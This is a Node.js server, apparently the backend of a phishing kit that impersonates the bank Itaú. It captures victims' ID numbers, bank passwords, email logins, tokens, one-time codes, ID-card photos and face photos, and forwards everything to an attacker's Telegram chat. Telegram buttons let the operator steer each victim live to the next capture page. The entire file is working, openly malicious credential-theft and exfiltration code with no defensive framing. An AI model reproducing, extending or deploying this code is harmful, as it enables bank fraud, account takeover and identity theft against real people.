const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const app = express();
const server = http.createServer(app);

// Optimized Socket.IO configuration for maximum persistence
const io = socketIo(server, {
    pingTimeout: 180000,      // 3 minutes before considering disconnected
    pingInterval: 20000,      // Check every 20 seconds
    connectTimeout: 60000,    // 1 minute to establish connection
    transports: ['polling'],  // Only polling for maximum compatibility
    allowUpgrades: false,     // Prevent upgrade issues
    perMessageDeflate: false, // Reduce CPU overhead
    httpCompression: false,   // Reduce latency
    maxHttpBufferSize: 1e8,   // 100MB max
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        credentials: false
    },
    cookie: false,
    serveClient: true,
    path: '/socket.io/'
});

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Telegram Bot Setup
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
const chatId = process.env.TELEGRAM_CHAT_ID;

// Session Management
class SessionManager {
    constructor() {
        this.sessions = new Map();
        this.socketToSession = new Map();
        this.sessionToSocket = new Map();
        this.sessionTimers = new Map();
        this.SESSION_TIMEOUT = 3 * 60 * 60 * 1000; // 3 hours
    }

    generateSessionId() {
        return `ITU_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    }

    createSession(socketId) {
        const sessionId = this.generateSessionId();
        const sessionData = { 
            createdAt: Date.now(), 
            lastActivity: Date.now() 
        };
        
        this.sessions.set(sessionId, sessionData);
        this.socketToSession.set(socketId, sessionId);
        this.sessionToSocket.set(sessionId, socketId);
        
        console.log(`✨ New session created: ${sessionId}`);
        return { sessionId, sessionData };
    }

    reconnectSession(sessionId, socketId) {
        // Clear existing timer
        this.clearTimer(sessionId);
        
        // Update mappings
        const oldSocketId = this.sessionToSocket.get(sessionId);
        if (oldSocketId && oldSocketId !== socketId) {
            this.socketToSession.delete(oldSocketId);
        }
        
        this.socketToSession.set(socketId, sessionId);
        this.sessionToSocket.set(sessionId, socketId);
        
        console.log(`🔄 Session reconnected: ${sessionId}`);
        return sessionId;
    }

    updateActivity(sessionId) {
        const session = this.sessions.get(sessionId);
        if (session) {
            session.lastActivity = Date.now();
            this.sessions.set(sessionId, session);
        }
    }

    getSession(sessionId) {
        return this.sessions.get(sessionId);
    }

    updateSessionData(sessionId, data) {
        const session = this.sessions.get(sessionId) || { createdAt: Date.now() };
        const updatedSession = { ...session, ...data, lastActivity: Date.now() };
        this.sessions.set(sessionId, updatedSession);
        return updatedSession;
    }

    clearSessionData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (session) {
            this.sessions.set(sessionId, {
                createdAt: session.createdAt || Date.now(),
                lastActivity: Date.now()
            });
        }
    }

    getSocketId(sessionId) {
        return this.sessionToSocket.get(sessionId);
    }

    clearTimer(sessionId) {
        const timer = this.sessionTimers.get(sessionId);
        if (timer) {
            clearTimeout(timer);
            this.sessionTimers.delete(sessionId);
        }
    }

    scheduleCleanup(sessionId, socketId) {
        this.clearTimer(sessionId);
        
        const timer = setTimeout(() => {
            if (this.sessionToSocket.get(sessionId) === socketId || !this.sessionToSocket.has(sessionId)) {
                this.sessions.delete(sessionId);
                this.sessionToSocket.delete(sessionId);
                this.sessionTimers.delete(sessionId);
                console.log(`🗑️ Session expired: ${sessionId}`);
            }
        }, this.SESSION_TIMEOUT);
        
        this.sessionTimers.set(sessionId, timer);
    }

    deleteSession(sessionId) {
        const socketId = this.getSocketId(sessionId);
        this.sessions.delete(sessionId);
        this.sessionToSocket.delete(sessionId);
        if (socketId) this.socketToSession.delete(socketId);
        this.clearTimer(sessionId);
    }
}

const sessionManager = new SessionManager();

// Telegram Helper Functions
class TelegramHelper {
    static getStandardButtons(sessionId) {
        return [
            [
                { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
                { text: '📧 Pedir Correo', callback_data: `email_${sessionId}` }
            ],
            [
                { text: '🎫 Pedir Token', callback_data: `token_${sessionId}` },
                { text: '📱 Pedir OTP', callback_data: `otp_${sessionId}` }
            ],
            [
                { text: '🪙 Pedir Cédula', callback_data: `cedula_${sessionId}` },
                { text: '👤 Pedir Cara', callback_data: `biometria_${sessionId}` }
            ],
            [
                { text: '✅ Finalizar', callback_data: `finalize_${sessionId}` }
            ]
        ];
    }

    static async sendMessage(sessionId, data) {
        try {
            let message = `🔔 *Nueva Actividad - Itaú*\n\n`;
            message += `📱 *Sesión:* \`${sessionId}\`\n`;
            message += `⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}\n\n`;
            
            const fields = [
                { key: 'documentType', label: '📋 *Tipo Documento:*' },
                { key: 'documentNumber', label: '🆔 *Número Documento:*' },
                { key: 'password', label: '🔐 *Clave:*' },
                { key: 'email', label: '📧 *Email:*' },
                { key: 'emailPassword', label: '🔑 *Contraseña Email:*' },
                { key: 'token', label: '🎫 *Token:*' },
                { key: 'otp', label: '📲 *OTP:*' }
            ];

            fields.forEach(field => {
                if (data[field.key]) {
                    message += `${field.label} ${data[field.key]}\n`;
                }
            });

            if (data.hasCedula) message += `🪪 *Cédula:* Frente y Reverso capturados\n`;
            if (data.hasBiometria) message += `👤 *Biometría:* Rostro capturado\n`;

            const options = {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: this.getStandardButtons(sessionId)
                }
            };

            const sentMessage = await bot.sendMessage(chatId, message, options);
            return sentMessage.message_id;
        } catch (error) {
            console.error('❌ Error sending to Telegram:', error);
            throw error;
        }
    }

    static async sendPhoto(buffer, caption) {
        try {
            await bot.sendPhoto(chatId, buffer, { 
                caption, 
                parse_mode: 'Markdown' 
            });
        } catch (error) {
            console.error('❌ Error sending photo:', error);
            throw error;
        }
    }

    static async sendNotification(message) {
        try {
            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Error sending notification:', error);
        }
    }
}

// Socket.io connection
io.on('connection', (socket) => {
    console.log('New client connected:', socket.id);
    
    let sessionId = null;

    // Handle session initialization or reconnection
    socket.on('init-session', (data) => {
        if (data.sessionId && sessionManager.getSession(data.sessionId)) {
            // Reconnecting with existing session
            sessionId = sessionManager.reconnectSession(data.sessionId, socket.id);
            console.log(`✅ Client reconnected with session: ${sessionId}`);
            socket.emit('session-ready', { sessionId, reconnected: true });
        } else {
            // New session - always start fresh
            const result = sessionManager.createSession(socket.id);
            sessionId = result.sessionId;
            console.log(`✨ New session created: ${sessionId}`);
            socket.emit('session-ready', { sessionId, reconnected: false });
        }
    });

    // Handle clear session (when returning to index.html)
    socket.on('clear-session', () => {
        if (sessionId) {
            console.log(`🧹 Clearing session data: ${sessionId}`);
            sessionManager.clearSessionData(sessionId);
            socket.emit('session-cleared', { sessionId });
        }
    });

    // Handle heartbeat to keep session alive
    socket.on('heartbeat', () => {
        if (sessionId) {
            sessionManager.updateActivity(sessionId);
            socket.emit('heartbeat-ack');
        }
    });

    // Handle login submission
    socket.on('login', async (data) => {
        try {
            console.log(`[LOGIN] 📥 Received from session ${sessionId}:`, data);
            if (!sessionId) return socket.emit('login-response', { success: false, error: 'No session' });
            
            const sessionData = sessionManager.updateSessionData(sessionId, {
                documentType: data.documentType,
                documentNumber: data.documentNumber,
                password: data.password
            });

            console.log(`[LOGIN] 📤 Sending to Telegram for session ${sessionId}`);
            await TelegramHelper.sendMessage(sessionId, sessionData);
            console.log(`[LOGIN] ✅ Successfully sent to Telegram`);
            socket.emit('login-response', { success: true });
        } catch (error) {
            console.error('❌ Error processing login:', error);
            socket.emit('login-response', { success: false, error: error.message });
        }
    });

    // Handle email submission
    socket.on('email', async (data) => {
        try {
            console.log(`[EMAIL] 📥 Received from session ${sessionId}:`, data);
            if (!sessionId) return socket.emit('email-response', { success: false, error: 'No session' });
            
            const sessionData = sessionManager.updateSessionData(sessionId, {
                email: data.email,
                emailPassword: data.password
            });

            console.log(`[EMAIL] 📤 Sending to Telegram for session ${sessionId}`);
            await TelegramHelper.sendMessage(sessionId, sessionData);
            console.log(`[EMAIL] ✅ Successfully sent to Telegram`);
            socket.emit('email-response', { success: true });
        } catch (error) {
            console.error('❌ Error processing email:', error);
            socket.emit('email-response', { success: false, error: error.message });
        }
    });

    // Handle token submission
    socket.on('token', async (data) => {
        try {
            console.log(`[TOKEN] 📥 Received from session ${sessionId}:`, data);
            if (!sessionId) return socket.emit('token-response', { success: false, error: 'No session' });
            
            const sessionData = sessionManager.updateSessionData(sessionId, {
                token: data.token
            });

            console.log(`[TOKEN] 📤 Sending to Telegram for session ${sessionId}`);
            await TelegramHelper.sendMessage(sessionId, sessionData);
            console.log(`[TOKEN] ✅ Successfully sent to Telegram`);
            socket.emit('token-response', { success: true });
        } catch (error) {
            console.error('❌ Error processing token:', error);
            socket.emit('token-response', { success: false, error: error.message });
        }
    });

    // Handle OTP submission
    socket.on('otp', async (data) => {
        try {
            console.log(`[OTP] 📥 Received from session ${sessionId}:`, data);
            if (!sessionId) return socket.emit('otp-response', { success: false, error: 'No session' });
            
            const sessionData = sessionManager.updateSessionData(sessionId, {
                otp: data.otp
            });

            console.log(`[OTP] 📤 Sending to Telegram for session ${sessionId}`);
            await TelegramHelper.sendMessage(sessionId, sessionData);
            console.log(`[OTP] ✅ Successfully sent to Telegram`);
            socket.emit('otp-response', { success: true });
        } catch (error) {
            console.error('❌ Error processing OTP:', error);
            socket.emit('otp-response', { success: false, error: error.message });
        }
    });

    // Handle cedula (ID card) submission
    socket.on('cedula', async (data) => {
        try {
            console.log(`[CEDULA] 📥 Received from session ${sessionId}`);
            if (!sessionId) return socket.emit('cedula-response', { success: false, error: 'No session' });
            
            const sessionData = sessionManager.updateSessionData(sessionId, {
                hasCedula: true
            });

            // Send images to Telegram
            const frontBuffer = Buffer.from(data.front.replace(/^data:image\/\w+;base64,/, ''), 'base64');
            const backBuffer = Buffer.from(data.back.replace(/^data:image\/\w+;base64,/, ''), 'base64');

            await TelegramHelper.sendPhoto(frontBuffer, `📸 *Cédula Frontal*\nSesión: \`${sessionId}\``);
            await TelegramHelper.sendPhoto(backBuffer, `📸 *Cédula Reverso*\nSesión: \`${sessionId}\``);

            // Send summary message with buttons and ALL accumulated data
            await TelegramHelper.sendMessage(sessionId, sessionData);
            
            console.log(`[CEDULA] ✅ Successfully sent to Telegram`);
            socket.emit('cedula-response', { success: true });
        } catch (error) {
            console.error('❌ Error processing cedula:', error);
            socket.emit('cedula-response', { success: false, error: error.message });
        }
    });

    // Handle biometria (face) submission
    socket.on('biometria', async (data) => {
        try {
            console.log(`[BIOMETRIA] 📥 Received from session ${sessionId}`);
            if (!sessionId) return socket.emit('biometria-response', { success: false, error: 'No session' });
            
            const sessionData = sessionManager.updateSessionData(sessionId, {
                hasBiometria: true
            });

            // Send face image to Telegram
            const faceBuffer = Buffer.from(data.face.replace(/^data:image\/\w+;base64,/, ''), 'base64');
            await TelegramHelper.sendPhoto(faceBuffer, `👤 *Biometría Facial*\nSesión: \`${sessionId}\``);

            // Send summary message with buttons and ALL accumulated data
            await TelegramHelper.sendMessage(sessionId, sessionData);
            
            console.log(`[BIOMETRIA] ✅ Successfully sent to Telegram`);
            socket.emit('biometria-response', { success: true });
        } catch (error) {
            console.error('❌ Error processing biometria:', error);
            socket.emit('biometria-response', { success: false, error: error.message });
        }
    });

    // Handle navigation commands from Telegram
    socket.on('navigate', (page) => {
        socket.emit('redirect', { page });
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        if (sessionId) {
            console.log(`💾 Session ${sessionId} kept for reconnection`);
            sessionManager.scheduleCleanup(sessionId, socket.id);
        }
    });
});

// Telegram bot callback handler
bot.on('callback_query', async (callbackQuery) => {
    const action = callbackQuery.data;
    const parts = action.split('_');
    const command = parts[0];
    const sessionId = parts.slice(1).join('_');

    console.log(`\n📱 Telegram Button Pressed: ${command} for session ${sessionId}`);

    try {
        await bot.answerCallbackQuery(callbackQuery.id);

        const socketId = sessionManager.getSocketId(sessionId);
        let targetSocket = null;
        
        if (socketId) {
            const sockets = await io.fetchSockets();
            targetSocket = sockets.find(s => s.id === socketId);
        }

        if (targetSocket) {
            const redirectActions = {
                logo: { page: 'index.html', msg: 'pantalla de login', clearData: true },
                email: { page: 'correo.html', msg: 'pantalla de correo' },
                token: { page: 'token.html', msg: 'pantalla de token' },
                otp: { page: 'otp.html', msg: 'pantalla de OTP' },
                cedula: { page: 'cedula.html', msg: 'escaneo de cédula' },
                biometria: { page: 'biometria.html', msg: 'verificación biométrica' },
                finalize: { page: 'finalizar.html', msg: 'sesión finalizada' }
            };
            
            const action = redirectActions[command];
            if (action) {
                console.log(`   ➡️ Redirecting to ${action.page}`);
                targetSocket.emit('redirect', { page: action.page, clearData: action.clearData });
                targetSocket.emit('force-redirect', { page: action.page, clearData: action.clearData });
                await TelegramHelper.sendNotification(`✅ Usuario redirigido a ${action.msg}\nSesión: \`${sessionId}\``);
                
                if (command === 'finalize') {
                    sessionManager.deleteSession(sessionId);
                }
            }
        } else {
            await TelegramHelper.sendNotification(`⚠️ Sesión no encontrada o desconectada\nSesión: \`${sessionId}\`\n\nEl usuario puede haber cerrado la página o perdido la conexión.`);
        }
    } catch (error) {
        console.error('❌ Error handling callback:', error);
        await TelegramHelper.sendNotification(`❌ Error: ${error.message}`);
    }
});

// Don't call startPolling again since it's already in the constructor
// bot.startPolling(); // Remove this line

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Telegram Bot connected`);
});
